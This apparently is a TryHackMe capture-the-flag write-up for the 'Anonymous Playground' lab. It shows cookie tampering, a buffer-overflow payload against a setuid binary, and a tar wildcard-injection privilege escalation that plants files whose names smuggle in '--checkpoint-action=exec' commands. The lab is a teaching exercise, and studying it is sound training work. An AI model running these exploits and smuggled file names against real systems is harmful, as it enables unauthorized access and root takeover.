## Anonymous Playground — TryHackMe Writeup

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/Anonymous%20Playground/Images/anonymous.png)

**Room Description**: Want to become part of Anonymous? They have a challenge for you. Can you get the flags and become an operative?

**Room Link**: [Anonymous Playground](https://tryhackme.com/room/anonymousplayground)

> So, you've decided to sign up with Anonymous?  Well, it won't be that easy.  They've constructed a vulnerable CTF machine for
you to hack your way into and prove you have what it takes to become a member of Anonymous.  Can you do it?  Do you have
what it takes?

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/Anonymous%20Playground/Images/Screenshot%20From%202026-10-01%2011-52-49.png)

---

#### Objectives: 
  - User 1 Flag
  - User 2 Flag
  - User 3 Flag

---

> Add the target to hosts:

```zsh
sudo echo -e '10.128.186.164 anon.thm' | sudo tee -a /etc/hosts
```

---

## Enum & Recon

```zsh
nmap -p- -T4 -n -Pn anon.thm
```

```zsh
nmap -p80 -sV anon.thm --script http*
```

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/Anonymous%20Playground/Images/Screenshot%20From%202026-09-30%2018-40-18.png)

> Directory Bruteforcing gave me the secret directory (which is already exposed inside /robots.txt): `/zYdHuAKjP`. If we visit it, we are denied access. But how does the server know who we are, and determine if we have the authorization to access this resource or not? After intercepting the request with burpsuite, I noticed we were assigned a cookie, which had the value `access=denied`. So a simple action like changing the `denied` value to `granted` will grant us the access to see what's in this directory.

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/Anonymous%20Playground/Images/Screenshot%20From%202026-09-30%2018-50-28.png)

> Before

```
GET /zYdHuAKjP/ HTTP/1.1
Host: anon.thm
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: access=denied
Connection: keep-alive

```

> After

```
GET /zYdHuAKjP/ HTTP/1.1
Host: anon.thm
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: access=granted
Connection: keep-alive

```

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/Anonymous%20Playground/Images/Screenshot%20From%202026-09-30%2019-38-47.png)


> It looks like we have to decode this. From the structure of it, it's really easy to tell that `::` is the separator for something like `username:password`. Secondly, there was a pattern - one lowercase and one uppercase character, and finally another clue is that there is a partial repetition in password section which has the same string from username in its first part. Which we can conclude it's something like `user:user123@!` for SSH. Now, with the help of the hint, we see `zA is 'a'`. Firstly, I converted `z` to its alphabetical position - `26`, and `A` to `27` as it was uppercase, and tried to solve it like `27-26=1` which made sense, as 'a' would be 1. But as it did not work, I used `A` as 1 as well, and solved it like `26+1=1`, as the next letter after `z` would be `a` if we think of it as a loop. Finally, the credentials we get is:

```
magna:magnaisanelephant```

---

## Initial Foothold

> Let's ssh into user `magna`

```zsh
ssh magna@anon.thm
```

```zsh
magna@ip-10-128-189-54:~$ ls -la
total 64
drwxr-xr-x 7 magna  magna  4096 Jul 10  2020 .
drwxr-xr-x 6 root   root   4096 Sep 30 14:31 ..
lrwxrwxrwx 1 root   root      9 Jul  4  2020 .bash_history -> /dev/null
-rw-r--r-- 1 magna  magna   220 Jul  4  2020 .bash_logout
-rw-r--r-- 1 magna  magna  3771 Jul  4  2020 .bashrc
drwx------ 2 magna  magna  4096 Jul  4  2020 .cache
drwxr-xr-x 3 magna  magna  4096 Jul  7  2020 .config
-r-------- 1 magna  magna    33 Jul  4  2020 flag.txt
drwx------ 3 magna  magna  4096 Jul  4  2020 .gnupg
-rwsr-xr-x 1 root   root   8528 Jul 10  2020 hacktheworld
drwxrwxr-x 3 magna  magna  4096 Jul  4  2020 .local
-rw-r--r-- 1 spooky spooky  324 Jul  6  2020 note_from_spooky.txt
-rw-r--r-- 1 magna  magna   807 Jul  4  2020 .profile
drwx------ 2 magna  magna  4096 Jul  4  2020 .ssh
-rw------- 1 magna  magna   817 Jul  7  2020 .viminfo
magna@ip-10-128-189-54:~$ cat note_from_spooky.txt 
Hey Magna,

Check out this binary I made!  I've been practicing my skills in C so that I can get better at Reverse
Engineering and Malware Development.  I think this is a really good start.  See if you can break it!

P.S. I've had the admins install radare2 and gdb so you can debug and reverse it right here!

Best,
Spooky
```

> Firstly, I checke the file type

```zsh
hacktheworld: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=7de2fcf9c977c96655ebae5f01a013f3294b6b31, not stripped
```

> And as soon as I noticed it asked for input after executing the binary file Spooky created, I tested for Buffer Overflow, as we can confirm from the segmentation fault error.

```zsh
magna@ip-10-128-189-54:~$ ./hacktheworld 
Who do you want to hack? world
magna@ip-10-128-189-54:~$ ./hacktheworld
Who do you want to hack? 
magna@ip-10-128-189-54:~$ ./hacktheworld
Who do you want to hack? aaaaaaaaaaaaaaaaaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

> The C code does not properly check the bounds. We need to reverse engineer it, and trigger a buffer overflow to get a shell as the user `spooky`. First, I used strings to dump the cleartext strings, rather than unreadable binary code. You can find the full output [here](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/Anonymous%20Playground/strings_output.txt)

> The interesting part is:

```
setuid
gets
puts
printf
system
sleep
__libc_start_main
GLIBC_2.2.5
__gmon_start__
AWAVI
AUATL
[]A\A]A^A_
We are Anonymous.
We are Legion.
We do not forgive.
We do not forget.
[Message corrupted]...Well...done.
/bin/sh
Who do you want to hack? 
```

> Readelf:

```zsh
readelf -s hacktheworld

50: 0000000000400657   129 FUNC    GLOBAL DEFAULT   13 call_bash (Interesting Line)
```

> The thing is: puts is a vulnerable function, which is vulnerable to buffer overflow attacks. But for it to be completely understandable, let's walk through the vulnerability itself, and how we can exploit the binary in this case.

---

## Explanation of Buffer Overflow for Newbies:

> What is a program? It is a set of instruction which the CPU follows. Each instruction has its own memory address. We may show a simple example like

```
Address    Instruction
100        print "Hello"
104        print "World"
108        stop
```

> Okay, now what is a function? Well, in programming, you would want to reuse a code. Instead of writing it from the scratch, you give the function a name and call it which contains the code you want to run. Let it be `say_hello` which lives in memory address `200` in this instance for us. When the main program wants to say hello, it jumps to that memory address, runs it, and goes back where it was. How do we know where it comes back? We look at the sticky note in memory called ***return address***. When say_hello finishes at address 200, it looks at the sticky note, sees "108", and jumps back there.

```C
// Main program:
100   do stuff
104   jump to say_hello, remember to come back to 108
108   do more stuff
```

> And... Where does the sticky note live? The stack. The stack is just a chunk of memory the program uses as scratch space. Each time a function is called, the program puts a new sticky note (return address) on the top of the stack. We can picture it like this:

```
Top of stack → [ return address ]   ← the note for the current function
               [ saved register  ]
               [ local variables ]
               [ ...             ]
Bottom
```

#### *What is a buffer?*

> When a function needs to store something the user typed (like a name), it reserves a box on the stack. That box is called a buffer. Say the box is 64 bytes big:

```
               [ return address ]   ← sticky note
               [ saved stuff    ]
               [ buffer: 64 bytes ] ← the box for your input
```

---


> Now we have the basic understanding, we can move onto our own code. The original code prints the slogan and calls the function below after a successful buffer overflow attack. This is cause by the vulnerable function called `gets()`. The program reads your name, and writes it to the buffer, but does not actually check that if the user input is bigger/longer than the allowed buffer.

```
Before overflow:
[ return address ]    ← important!
[ saved stuff    ]
[ buffer: 64 bytes ]

After overflow (typing 200 A's):
[ AAAAAAAA ]  ← A's overwrote the return address!
[ AAAAAAAA ]
[ AAAAA...  ]  ← 64 bytes of A's filled the buffer
```

> Now the return address is just `AAAA`, not a real memory address. So it jumps to the non-existent memory address, and causes segmentation fault we saw. Okay, but how do we control where CPU jumps to in memory? We have to replace the return address with the function's we want to execute. It will be `call_bash()` function at address 0x400657 in this case. We know from the output of readelf its memory address. Now we need to replace it. We need to fill the first 72 bytes with junk, and fill the memory address with the memory address of the function `call_bash()` which spawns /bin/sh. The next 8 bytes land exactly on the return address.

```C
void call_bash() {
    system("/bin/sh");
}
```

> However, there's a catch. On 64-bit Linux, there's a rule: when certain functions (like system) are called, the stack must be aligned to 16 bytes. If it's not, the program crashes inside system instead of giving a shell. We need to jump to a ret instruction first. That ret pops 8 bytes off the stack (fixing alignment), then jumps to whatever is next on the stack, which will be call_bash. Now the payload becomes:

```
[ 72 bytes junk ][ address of ret ][ address of call_bash ]
```

> The ret we use is at 0x40070f (it's just the ret at the end of main). And it becomes:

```
b'A' * 72                          # 72 junk bytes
+ (0x40070f).to_bytes(8, 'little') # address of ret, 8 bytes
+ (0x400657).to_bytes(8, 'little') # address of call_bash, 8 bytes
```

> Now we can construct the payload using python:

```python3
(python3 -c "import sys; sys.stdout.buffer.write(b'A'*72 + (0x40070f).to_bytes(8,'little') + (0x400657).to_bytes(8,'little'))"; cat) | ./hacktheworld
```

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/Anonymous%20Playground/Images/Screenshot%20From%202026-10-01%2011-05-04.png)

> Now that we successfully exploited the vulnerability, and comprimised the user `spooky`, we may go ahead and spawn a clean shell for us using python.

```zsh
python3 -c 'import pty;pty.spawn("/bin/bash")'
spooky@ip-10-130-166-140:~$ 
```

---

## Privilege Escalation

> After some local enumeration, I found a crontjob:

```zsh
spooky@ip-10-130-166-140:/home/spooky$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/1 *   * * *   root    cd /home/spooky && tar -zcf /var/backups/spooky.tgz *
#
```

> This is a textbook vulnerability where we can set checkpoints to execute commands on behalf of root.

```zsh
cat > shell.sh <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF

chmod +x shell.sh

touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
./tmp/rootbash -p
```

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/Anonymous%20Playground/Images/Screenshot%20From%202026-10-01%2011-50-37.png)

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/Anonymous%20Playground/Images/Screenshot%20From%202026-10-01%2011-51-44.png)

> And we complete this CTF.
